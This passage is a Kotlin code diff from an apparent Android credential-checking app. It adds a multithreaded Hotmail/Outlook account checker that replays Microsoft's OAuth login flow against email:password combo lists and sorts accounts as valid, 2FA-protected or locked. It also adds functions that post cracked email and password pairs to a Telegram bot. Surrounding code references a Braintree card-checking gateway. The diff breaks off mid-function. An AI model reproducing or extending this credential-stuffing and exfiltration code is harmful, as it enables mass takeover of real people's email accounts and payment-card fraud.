@@ -95,6 +95,8 @@ data class GrowFollowState(
 data class RepeatState(
     val accountList: String = "",
     val threadCount: String = "5",
+    val botToken: String = "",
+    val chatId: String = "",
     val statusText: String = "جاهز",
     val isRunning: Boolean = false,
     val hits: Int = 0,
@@ -118,6 +120,20 @@ data class OtpState(
     val logs: List<String> = emptyList()
 )
 
+data class HotmailState(
+    val accountList: String = "",
+    val threadCount: String = "5",
+    val botToken: String = "",
+    val chatId: String = "",
+    val statusText: String = "جاهز",
+    val isRunning: Boolean = false,
+    val good: Int = 0,
+    val bad: Int = 0,
+    val twoFa: Int = 0,
+    val unknown: Int = 0,
+    val logs: List<String> = emptyList()
+)
+
 class CheckerViewModel : ViewModel() {
     private val _state = MutableStateFlow(CheckerState())
     val state: StateFlow<CheckerState> = _state.asStateFlow()
@@ -136,6 +152,9 @@ class CheckerViewModel : ViewModel() {
 
     private val _otpState = MutableStateFlow(OtpState())
     val otpState: StateFlow<OtpState> = _otpState.asStateFlow()
+
+    private val _hotmailState = MutableStateFlow(HotmailState())
+    val hotmailState: StateFlow<HotmailState> = _hotmailState.asStateFlow()
 
     fun updateState(transform: CheckerState.() -> CheckerState) {
         _state.update(transform)
@@ -608,6 +627,8 @@ class CheckerViewModel : ViewModel() {
     // --- Repeat Checker Functions ---
     fun updateRepeatAccountList(text: String) { _repeatState.update { it.copy(accountList = text) } }
     fun updateRepeatThreads(text: String) { _repeatState.update { it.copy(threadCount = text) } }
+    fun updateRepeatBotToken(text: String) { _repeatState.update { it.copy(botToken = text) } }
+    fun updateRepeatChatId(text: String) { _repeatState.update { it.copy(chatId = text) } }
 
     private var repeatJob: Job? = null
     
@@ -749,8 +770,10 @@ class CheckerViewModel : ViewModel() {
                 updateRepeatStats(hit = 1)
                 if (blockCapture) {
                     addRepeatLog("HIT (No Cap) -> $email:$password")
+                    sendRepeatTelegram(email, password, displayName, "0", "0", "Unknown")
                 } else {
                     addRepeatLog("HIT -> $email | Cash: $balance, Coins: $coins, Country: $country")
+                    sendRepeatTelegram(email, password, displayName, balance, coins, country)
                 }
             }
         } catch (e: Exception) {
@@ -781,6 +804,28 @@ class CheckerViewModel : ViewModel() {
                 it.copy(logs = newLogs)
             }
         }
+    }
+
+    private fun sendRepeatTelegram(email: String, ps: String, name: String, balance: String, coins: String, country: String) {
+        val botToken = _repeatState.value.botToken
+        val chatId = _repeatState.value.chatId
+        if (botToken.isBlank() || chatId.isBlank()) return
+
+        Thread {
+            try {
+                val mdMsg = "[HIT] $email | Name: $name | Cash: $balance | Coins: $coins | Country: $country | @Real_zezomod"
+                val form = FormBody.Builder()
+                    .add("chat_id", chatId)
+                    .add("text", mdMsg)
+                    .build()
+                val request = Request.Builder()
+                    .url("https://api.telegram.org/bot$botToken/sendMessage")
+                    .post(form)
+                    .build()
+                val client = OkHttpClient()
+                client.newCall(request).execute().close()
+            } catch (e: Exception) { }
+        }.start()
     }
     
     // --- OTP Checker Functions ---
@@ -1039,6 +1084,256 @@ class CheckerViewModel : ViewModel() {
         Thread {
             try {
                 val mdMsg = "<b>$statusFlag</b>\n- <b>Card</b> ⇾ <code>$combo</code>\n- <b>Gateway</b> ⇾ Braintree Lookup\n- <b>Response</b> ⇾ $responseStr\n━━━━━━━━━━━━━━━━\n[↯] <b>Bot By</b> ⇾ @taalf"
+                val form = FormBody.Builder()
+                    .add("chat_id", chatId)
+                    .add("text", mdMsg)
+                    .add("parse_mode", "HTML")
+                    .build()
+                val request = Request.Builder()
+                    .url("https://api.telegram.org/bot$botToken/sendMessage")
+                    .post(form)
+                    .build()
+                val client = OkHttpClient()
+                client.newCall(request).execute().close()
+            } catch (e: Exception) { }
+        }.start()
+    }
+    
+    // --- Hotmail Checker Functions ---
+    fun updateHotmailAccountList(text: String) { _hotmailState.update { it.copy(accountList = text) } }
+    fun updateHotmailBotToken(text: String) { _hotmailState.update { it.copy(botToken = text) } }
+    fun updateHotmailChatId(text: String) { _hotmailState.update { it.copy(chatId = text) } }
+    fun updateHotmailThreads(text: String) { _hotmailState.update { it.copy(threadCount = text) } }
+
+    private var hotmailJob: Job? = null
+    
+    fun startHotmailChecking() {
+        if (_hotmailState.value.isRunning) return
+        val accounts = _hotmailState.value.accountList.lines().filter { it.isNotBlank() }.map { it.trim() }
+        if (accounts.isEmpty()) {
+            _hotmailState.update { it.copy(statusText = "الرجاء إدخال حسابات أولاً.") }
+            return
+        }
+
+        _hotmailState.update { 
+            it.copy(
+                isRunning = true,
+                good = 0,
+                bad = 0,
+                twoFa = 0,
+                unknown = 0,
+                logs = emptyList(),
+                statusText = "جاري الفحص..."
+            )
+        }
+
+        hotmailJob = viewModelScope.launch(Dispatchers.IO) {
+            val numThreads = _hotmailState.value.threadCount.toIntOrNull() ?: 5
+            val accountQueue = kotlinx.coroutines.channels.Channel<String>(kotlinx.coroutines.channels.Channel.UNLIMITED)
+            accounts.forEach { accountQueue.trySend(it) }
+            accountQueue.close()
+
+            val workers = List(numThreads) {
+                launch {
+                    for (combo in accountQueue) {
+                        checkHotmailAccount(combo)
+                    }
+                }
+            }
+            workers.joinAll()
+            _hotmailState.update { it.copy(isRunning = false, statusText = "تم الانتهاء.") }
+        }
+    }
+
+    fun stopHotmailChecking() {
+        hotmailJob?.cancel()
+        _hotmailState.update { it.copy(isRunning = false, statusText = "تم التوقف.") }
+    }
+    
+    private suspend fun checkHotmailAccount(combo: String) {
+        val parts = combo.split(":", limit = 2)
+        if (parts.size < 2) {
+            addHotmailLog("$combo -> صيغة خاطئة")
+            updateHotmailStats(bad = 1)
+            return
+        }
+        val email = parts[0].trim()
+        val password = parts[1].trim()
+
+        val workerClient = OkHttpClient.Builder()
+            .followRedirects(false)
+            .followSslRedirects(false)
+            .connectTimeout(15, java.util.concurrent.TimeUnit.SECONDS)
+            .readTimeout(15, java.util.concurrent.TimeUnit.SECONDS)
+            .build()
+            
+        try {
+            // STEP 1: check account
+            val url1Req = Request.Builder()
+                .url("https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=1&emailAddress=$email")
+                .header("X-OneAuth-AppName", "Outlook Lite")
+                .header("X-Office-Version", "3.11.0-minApi24")
+                .header("User-Agent", "Dalvik/2.1.0 (Linux; U; Android 9; SM-G975N Build/PQ3B.190801.08041932)")
+                .build()
+
+            var r1Text = ""
+            workerClient.newCall(url1Req).execute().use { response ->
+                r1Text = response.body?.string() ?: ""
+            }
+            
+            if (r1Text.contains("Neither") || r1Text.contains("Both") || r1Text.contains("Placeholder") || r1Text.contains("OrgId")) {
+                updateHotmailStats(bad = 1)
+                addHotmailLog("BAD -> $email:$password")
+                return
+            }
+            if (!r1Text.contains("MSAccount")) {
+                updateHotmailStats(bad = 1)
+                addHotmailLog("BAD -> $email:$password")
+                return
+            }
+            
+            // STEP 2: authorize to get PPFT
+            val url2Req = Request.Builder()
+                .url("https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?client_info=1&haschrome=1&login_hint=$email&mkt=en&response_type=code&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D")
+                .header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
+                .build()
+
+            var r2Text = ""
+            var r2Url = ""
+            workerClient.newCall(url2Req).execute().use { response ->
+                r2Text = response.body?.string() ?: ""
+                r2Url = response.request.url.toString()
+            }
+
+            val urlPostMatcher = java.util.regex.Pattern.compile("urlPost\":\"([^\"]+)\"").matcher(r2Text)
+            val ppftMatcher = java.util.regex.Pattern.compile("name=\\\\\"PPFT\\\\\" id=\\\\\"i0327\\\\\" value=\\\\\"([^\"]+)\"").matcher(r2Text)
+
+            if (!urlPostMatcher.find() || !ppftMatcher.find()) {
+                updateHotmailStats(unknown = 1)
+                addHotmailLog("UNKNOWN -> $email:$password (Failed to extract Post/PPFT)")
+                return
+            }
+            val postUrl = urlPostMatcher.group(1)?.replace("\\\\/", "/") ?: ""
+            val ppft = ppftMatcher.group(1) ?: ""
+
+            // STEP 3: Login POST
+            val encEmail = java.net.URLEncoder.encode(email, "UTF-8")
+            val encPass = java.net.URLEncoder.encode(password, "UTF-8")
+            val encPpft = java.net.URLEncoder.encode(ppft, "UTF-8")
+            val loginData = "i13=1&login=$encEmail&loginfmt=$encEmail&type=11&LoginOptions=1&passwd=$encPass&ps=2&PPFT=$encPpft&PPSX=PassportR&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=0&i19=9960"
+
+            val url3Req = Request.Builder()
+                .url(postUrl)
+                .post(RequestBody.create("application/x-www-form-urlencoded".toMediaTypeOrNull(), loginData))
+                .header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
+                .header("Origin", "https://login.live.com")
+                .header("Referer", r2Url)
+                .build()
+
+            var r3Text = ""
+            var locationHeader = ""
+            workerClient.newCall(url3Req).execute().use { response ->
+                r3Text = response.body?.string() ?: ""
+                locationHeader = response.header("Location") ?: ""
+            }
+
+            if (r3Text.contains("account or password is incorrect") || r3Text.contains("error") || r3Text.contains("Incorrect password") || r3Text.contains("Invalid credentials")) {
+                updateHotmailStats(bad = 1)
+                addHotmailLog("BAD -> $email:$password")
+                return
+            }
+
+            if (r3Text.contains("identity/confirm") || r3Text.lowercase().contains("twofactor")) {
+                updateHotmailStats(twoFa = 1)
+                addHotmailLog("2FA -> $email:$password")
+                return
+            }
+
+            if (r3Text.contains("Abuse") || r3Text.contains("signedout") || r3Text.contains("locked")) {
+                updateHotmailStats(bad = 1)
+                addHotmailLog("BAD (Locked) -> $email:$password")
+                return
+            }
+
+            if (locationHeader.isEmpty()) {
+                updateHotmailStats(unknown = 1)
+                addHotmailLog("UNKNOWN -> $email:$password (No redirect Location)")
+                return
+            }
+
+            val codeMatcher = java.util.regex.Pattern.compile("code=([^&]+)").matcher(locationHeader)
+            if (!codeMatcher.find()) {
+                updateHotmailStats(bad = 1)
+                addHotmailLog("BAD -> $email:$password (No code in redirect)")
+                return
+            }
+
+            val code = codeMatcher.group(1) ?: ""
+
+            // STEP 4: Token Request
+            val tokenData = "client_info=1&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&redirect_uri=msauth://com.microsoft.outlooklite/fcg80qvoM1YMKJZibjBwQcDfOno%3D&grant_type=authorization_code&code=$code&scope=profile openid offline_access https://outlook.office.com/M365.Access"
+            val tokenReq = Request.Builder()
+                .url("https://login.microsoftonline.com/consumers/oauth2/v2.0/token")
+                .post(RequestBody.create("application/x-www-form-urlencoded".toMediaTypeOrNull(), tokenData))
+                .header("Content-Type", "application/x-www-form-urlencoded")
+                .build()
+
+            var r4Text = ""
+            var r4Code = 0
+            workerClient.newCall(tokenReq).execute().use { response ->
+                r4Code = response.code
+                r4Text = response.body?.string() ?: ""
+            }
+
+            if (r4Code != 200 || !r4Text.contains("access_token")) {
+                updateHotmailStats(bad = 1)
+                addHotmailLog("BAD -> $email:$password")
+                return
+            }
+
+            // HIT!
+            updateHotmailStats(good = 1)
+            addHotmailLog("GOOD ✅ -> $email:$password")
+            sendHotmailTelegram(email, password)
+
+        } catch (e: Exception) {
+            updateHotmailStats(unknown = 1)
+            addHotmailLog("ERROR -> $email:$password | ${e.message}")
+        }
+    }
+    
+    private suspend fun updateHotmailStats(good: Int = 0, bad: Int = 0, twoFa: Int = 0, unknown: Int = 0) {
+        withContext(Dispatchers.Main) {
+            _hotmailState.update { 
+                it.copy(
+                    good = it.good + good,
+                    bad = it.bad + bad,
+                    twoFa = it.twoFa + twoFa,
+                    unknown = it.unknown + unknown
+                )
+            }
+        }
+    }
+
+    private suspend fun addHotmailLog(msg: String) {
+        withContext(Dispatchers.Main) {
+            _hotmailState.update {
+                val newLogs = it.logs.toMutableList()
+                newLogs.add(0, msg)
+                if (newLogs.size > 100) newLogs.removeAt(newLogs.size - 1)
+                it.copy(logs = newLogs)
+            }
+        }
+    }
+
+    private fun sendHotmailTelegram(email: String, pass: String) {
+        val botToken = _hotmailState.value.botToken
+        val chatId = _hotmailState.value.chatId
+        if (botToken.isBlank() || chatId.isBlank()) return
+
+        Thread {
+            try {
+                val mdMsg = "<b>🔥 HOTMAIL HIT 🔥</b>\n- <b>Email</b> ⇾ <code>$email</code>\n- <b>Password</b> ⇾ <code>$pass</code>\n━━━━━━━━━━━━━━━━\n[↯] <b>Bot Checker</b>"
                 val form = FormBody.Builder()
                     .add("chat_id", chatId)
                     .add("text", mdMsg)
